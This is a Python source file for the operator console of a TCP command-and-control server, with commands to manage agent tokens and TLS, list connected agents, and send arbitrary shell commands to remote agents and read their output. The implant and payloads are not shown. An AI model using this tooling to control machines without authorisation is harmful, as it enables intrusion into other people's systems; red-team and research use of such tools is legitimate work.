import asyncio
from sys import exception, path
path.append("../../")
from protocols.tcp.tcp_server import TCPServer
from protocols.utils.prompt_style import styled_prompt
from protocols.utils.agent_menu import agent_menu
from protocols.utils.banner import banner
from colorama import Fore, init, Style
import bcrypt
from tabulate import tabulate
import secrets
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
import curses
import threading
from protocols.utils.utils import clear_screen
import json
from time import sleep
import os



class TcpServerController:
    def __init__(self) -> None:
        init(autoreset=True)
        self.selected_agent = None
        self.server_options = {"Host":"local_machine","Port":None,"Certificate":None,"Keyfile":None,"Agent_tokens":[]}
        self.console = Console()
        self.pre_native_commands ={
        "list": {
            "tokens": "Show all accepted agent tokens.",
            "commands": "Show native commands.",
            "options": "List server options.",
            "tls": "List tls settings."
        },
        "create": {
            "token": "Create a new C2 agent token.",
        },
        "remove": {
            "token": "Delete an token."
        },
        "set":{
            "host": "Set server host to bind.",
            "port": "Set server pot.",
            "cert": "Set server certificate.",
            "keyfile": "Set keyfile for certificate."
            },
        "start":{" ":"Start the server."},
        "run":{" ":"Start the server"},
        "exit|ctrl-c":{"": "Exit program."}
                }

        self.post_native_commands = {
        "select":{"": "Select agent menu.",
                  "id": "Select an agent from list."},
        "menu":{"": "Select agent menu."},
        "clear":{"":"Clear screen."},
        "list":{"options":"List server options.",
                "commands":"Show native commands.",
                "agents":"List connected agents.",
                "tokens": "List tokens"
                },
        "kill":{"server":"Kill server."},
        "create":{"token":"Create a new C2 agent token."}

         }
        self.agent_c2_commands = {
                "exit|back|quit":{"":"Quit agent session."},
                "?": {"":"List commands"},
                "[agent shell commands]":{"":"Example: ls"}
                }


    def show_native_commands(self,commands_list):
        table_rows = []
        for command, subcommands in commands_list.items():
            for sub, desc in subcommands.items():
                table_rows.append([command, sub, desc])
        table_rows.sort(key=lambda x: (x[1], x[0]))
        formatted_rows = []
        for row in table_rows:
            formatted_rows.append([
                f"{Fore.YELLOW}{row[0]}{Style.RESET_ALL}", 
                f"{Fore.GREEN}{row[1]}{Style.RESET_ALL}",  
                row[2]                                    
            ])
        headers = [
            f"{Fore.CYAN}COMMAND{Style.RESET_ALL}", 
            f"{Fore.CYAN}SUBCOMMAND{Style.RESET_ALL}", 
            f"{Fore.CYAN}Description{Style.RESET_ALL}"
        ]
        print(f"\n{Style.BRIGHT}NATIVE COMMAND LISTS{Style.RESET_ALL}")
        print(tabulate(formatted_rows, headers=headers, tablefmt="fancy_grid"))
    
    def show_agent_tokens(self):
        table_data = []
        if self.server_options["Agent_tokens"]:
            for id, token in enumerate(self.server_options["Agent_tokens"]):
                table_data.append([id,token])
        else:
            table_data.append(["None","None"])
        print(tabulate(table_data,headers=[f"{Fore.CYAN}ID{Fore.RESET}",f"{Fore.GREEN}TOKEN{Fore.RESET}"],tablefmt="fancy_grid",colalign=("left", "left")))


    def create_agent_token(self,bytes: int=8):
        try:
            token = secrets.token_urlsafe(bytes)
            self.server_options["Agent_tokens"].append(token)
            print(f"[{Fore.GREEN}!{Fore.RESET}] Successfully created token {Fore.BLUE}{bytes} bytes{Fore.RESET} ")
        except Exception as e:
            print(f"{Fore.RED}[!] ERROR: {e}")
        
        self.show_agent_tokens()

    def remove_agent_token(self, id: int = 0):
        if id < 0:
            print(f"{Fore.RED}[!] Invalid ID")
            return
        try:
            self.server_options["Agent_tokens"].pop(id)
            print(f"[{Fore.GREEN}!{Fore.RESET}] Successfully removed token")
        except Exception as e:
            print(f"{Fore.RED}[!] ERROR: {e}")
        self.show_agent_tokens()

    def show_server_options(self):
    
        table = Table(show_header=False, box=None)
        table.add_column("Key",style="bold cyan", justify="right")
        table.add_column("Value", style="green")
        table.add_row("Bind Host",self.server_options["Host"] if self.server_options["Host"] else str("None"))
        table.add_row("Bind Port", str(self.server_options["Port"]))
        table.add_row("SSL Enabled", "✅ Yes" if self.server_options["Certificate"] and self.server_options["Keyfile"]  else "❌ No")
        table.add_row("Auth Mode", "🔐 Token" if self.server_options["Agent_tokens"] else "⚠️ Open")
        panel = Panel(
        table,
        title="[bold yellow]Server Configuration[/bold yellow]",
        expand=False,
        border_style="blue")
        self.console.print(panel)

    def show_tls_config(self):
        table = Table(show_header=False, box=None)
        table.add_column("Key",style="bold cyan", justify="right")
        table.add_column("Value", style="green")
        table.add_row("Certificate",self.server_options["Certificate"] if self.server_options["Certificate"] else str("None"))
        table.add_row("Keyfile",self.server_options["Keyfile"] if self.server_options["Keyfile"] else str("None"))
        panel = Panel(
        table,
        title="[bold yellow]TLS Configuration[/bold yellow]",
        expand=False,
        border_style="blue")
        self.console.print(panel)


    def exec_async_func(self, coroutine):
        """Starts the server in a background daemon thread with a shutdown shield."""
        import threading

        def shielded_runner():
            try:
                asyncio.run(coroutine)
            except RuntimeError as e:
                # Silently ignore the loop-stop error, print others
                if "Event loop stopped" not in str(e):
                    print(f"[{Fore.RED}Internal Error{Fore.RESET}]: {e}")
            except KeyboardInterrupt:
                pass

        # Start the thread using our internal shielded_runner
        thread = threading.Thread(target=shielded_runner, daemon=True)
        thread.start()



    def list_agents(self,server):
        table_data = []
        if server.agent_count > 0:
            for agent  in server.agents:
                table_data.append([agent["id"], agent["ip"],agent["port"], agent["hostname"]])
        else:
            table_data.append([f"{Fore.RED}None{Fore.RESET}",f"{Fore.RED}None{Fore.RESET}",f"{Fore.RED}None{Fore.RESET}",f"{Fore.RED}None{Fore.RESET}"])
        print(tabulate(table_data,headers=[f"{Fore.CYAN}ID{Fore.RESET}",f"{Fore.GREEN}IP{Fore.RESET}",f"{Fore.MAGENTA}PORT{Fore.RESET}",f"{Fore.YELLOW}HOSTNAME{Fore.RESET}"],tablefmt="fancy_grid",colalign=("left", "left")))
    
    def server_home_screen_post_run(self,banner_title,banner_subtitle):
        clear_screen()
        banner(banner_title,banner_subtitle)
        self.show_server_options()


      
    def open_agent_session(self, agent_name, agent_id, server):
            session_history = []
            loop = server.loop

            while True:
                self.console.clear()
                self.console.rule(f"Agent {agent_name}")

                # Print current screen history
                for user, io in session_history:
                    color = "green" if user == "C2" else "red"
                    io = io if user == "C2" else f"\n{io}"
                    self.console.print(f"[bold {color}]{user}:[/bold {color}] {io}")

                command = Prompt.ask("[bold cyan]C2")

                if command.lower() in ["exit", "back", "quit"]:
                    break
                if command.lower() == "?":
                    self.show_native_commands(self.agent_c2_commands)
                    Prompt.ask("[italic]Press Enter to continue...[/italic]")
                    continue
                    
                # --- NEW: Intercept 'history' command locally ---
                if command.lower() == "history":
                    agent = next((a for a in server.agents if a["id"] == agent_id), None)
                    if agent and agent["tasks"]:
                        self.console.print("\n[bold magenta]--- Agent Task History ---[/bold magenta]")
                        for tid, tdata in agent["tasks"].items():
                            cmd = tdata["command"]
                            out = tdata["output"] if tdata["output"] is not None else "[Still Pending...]"
                            self.console.print(f"[bold cyan]Task ID:[/bold cyan] {tid}")
                            self.console.print(f"[bold cyan]Command:[/bold cyan] {cmd}")
                            self.console.print(f"[bold green]Output:[/bold green]\n{out}\n")
                        Prompt.ask("[italic]Press Enter to continue...[/italic]")
                    else:
                        self.console.print("[yellow]No task history available for this agent.[/yellow]")
                        Prompt.ask("[italic]Press Enter to continue...[/italic]")
                    continue # Skip sending this to the actual agent
                # ------------------------------------------------

                session_history.append(("C2", command))

                task_id = secrets.token_hex(4) 
                payload = json.dumps({
                    "task_id": task_id,
                    "command": command
                })

                try:
                    # 1. Register the task in the server's memory first
                    asyncio.run_coroutine_threadsafe(server.register_task(agent_id, task_id, command), loop)
                    
                    # 2. Send the payload
                    asyncio.run_coroutine_threadsafe(server.send(agent_id, payload), loop)
                    
                    # 3. Wait for the response
                    future = asyncio.run_coroutine_threadsafe(
                        server.get_task_response(agent_id, task_id, timeout=10), 
                        loop
                    )
                    response = future.result(timeout=11) 
                except Exception as e:
                    response = f"[Error/Timeout] {e}"
                session_history.append(("Agent", response))


    def start(self):
        banner_title = "TCP_Server"
        banner_subtitle = f"{Fore.WHITE}TCP controller | v1.0 | Made by {Fore.CYAN}0xfam936"
        banner(banner_title,banner_subtitle)
        username = "admin"
        while True:
            try:
                prompt = styled_prompt(username,self.server_options["Host"])            
                instruction = prompt().split()
                if len(instruction) == 1:
                    match instruction[0]:
                        case "start" | "run":
                            server = TCPServer(self.server_options["Host"],self.server_options["Port"],self.server_options["Certificate"],self.server_options["Keyfile"],self.server_options["Agent_tokens"])
                            self.exec_async_func(server.start())
                                                      
                            break
                        case "exit":
                            raise KeyboardInterrupt

                if len(instruction) >= 2:
                    match instruction[0]:
                        case "list":
                            match instruction[1]:
                                case "options":
                                    self.show_server_options()
                                case "commands":
                                    self.show_native_commands(self.pre_native_commands)
                                case "tokens":
                                    self.show_agent_tokens()
                                case "tls":
                                    self.show_tls_config()
                        case "create":
                            match instruction[1]:
                                case "token":
                                    if len(instruction) == 3:
                                        try:
                                            self.create_agent_token(int(instruction[2]))
                                        except:
                                            pass
                                    else:
                                        self.create_agent_token()
                        case "remove":
                            match instruction[1]:
                                case "token":
                                    try:
                                        self.remove_agent_token(int(instruction[2]))
                                    except:
                                        print(f"[{Fore.RED}!{Fore.RESET}] Invalid command use: {Fore.BLUE}remove token <id>")
                        case "set":
                            match instruction[1]:
                                case "host":
                                    try:
                                        self.server_options["Host"] = instruction[2]
                                    except:
                                        print(f"[{Fore.RED}!{Fore.RESET}] Invalid command use: {Fore.BLUE}set host <host>")
                                case "port":
                                    try:
                                        self.server_options["Port"] = int(instruction[2])
                                    except:
                                        print(f"[{Fore.RED}!{Fore.RESET}] Invalid command use: {Fore.BLUE}set port <port>")
                                case "cert":
                                    try:
                                        self.server_options["Certificate"] = instruction[2]
                                    except:
                                        print(f"[{Fore.RED}!{Fore.RESET}] Invalid command use: {Fore.BLUE}set cert <port>")
                                case "keyfile":
                                    try:
                                        self.server_options["Keyfile"] = instruction[2]
                                    except:
                                        print(f"[{Fore.RED}!{Fore.RESET}] Invalid command use: {Fore.BLUE}set keyfile <port>")
            except KeyboardInterrupt:
                    print(f"[{Fore.RED}!{Fore.RESET}] Exiting...")
                    sleep(2)
                    os._exit(0)


        self.server_home_screen_post_run(banner_title,banner_subtitle)
        while True: 
            try:
                instruction = prompt().split()
                if len(instruction) == 1:
                    match instruction[0]:
                        case "clear":
                            self.server_home_screen_post_run(banner_title,banner_subtitle)
                        case "select"| "menu":
                            self.selected_agent = curses.wrapper(lambda stdscr: agent_menu(stdscr, server.agents))
                            if self.selected_agent:
                                agent_id = int(self.selected_agent["id"])  # Convert id to integer
                                agent_name = f"{self.selected_agent["ip"]}@{self.selected_agent["hostname"]}"
                                self.open_agent_session(agent_name,agent_id,server)
                                self.server_home_screen_post_run(banner_title,banner_subtitle)


                if len(instruction) == 2:
                    match instruction[0]:
                            case "list":
                                match instruction[1]:
                                    case "options":
                                        self.show_server_options()
                                    case "commands":
                                        self.show_native_commands(self.post_native_commands)
                                    case "agents":
                                        self.list_agents(server)
                                    case "tls":
                                        self.show_tls_config()
                                    case "tokens":
                                        self.show_agent_tokens()
                
                            case "select":
                                try:
                                    # Convert input string to int
                                    target_id = int(instruction[1])
                                    
                                    # Check if the ID exists in the agents list
                                    agent = next((a for a in server.agents if a["id"] == target_id), None)

                                    if agent:
                                        agent_name = f"{agent['ip']}@{agent['hostname']}"
                                        self.open_agent_session(agent_name, target_id, server)
                                        self.server_home_screen_post_run(banner_title,banner_subtitle)
                                    else:
                                        # ID is a number, but not in our list
                                        self.console.print(f"[red][!] No agent found with ID {target_id}")
                                        self.list_agents(server)

                                except ValueError:
                                    # User typed 'select abc' instead of a number
                                    self.console.print("[red][!] Invalid ID format. Please provide a numeric Agent ID.")
                            case "create":
                                match instruction[1]:
                                    case "token":
                                        if len(instruction) == 3:
                                            try:
                                                self.create_agent_token(int(instruction[2]))
                                            except:
                                                pass
                                        else:
                                            self.create_agent_token()

                            case "kill":
                                if len(instruction) > 1 and instruction[1] == "server":
                                    asyncio.run_coroutine_threadsafe(server.shut_all_agents(), server.loop)

                                    self.console.print(f"[{Fore.RED}!{Fore.RESET}] Shutting down C2 Server...")
                                    if server.loop:
                                        server.loop.call_soon_threadsafe(server.loop.stop)
                                    sleep(1.5)
                                    os._exit(0)
            except KeyboardInterrupt:
                    print(f"[{Fore.RED}!{Fore.RESET}] Keyboard interruption received. Returning to main menu")
                    print(f"[{Fore.RED}!{Fore.RESET}] Use 'kill server' command to kill the server.")
                    sleep(2)








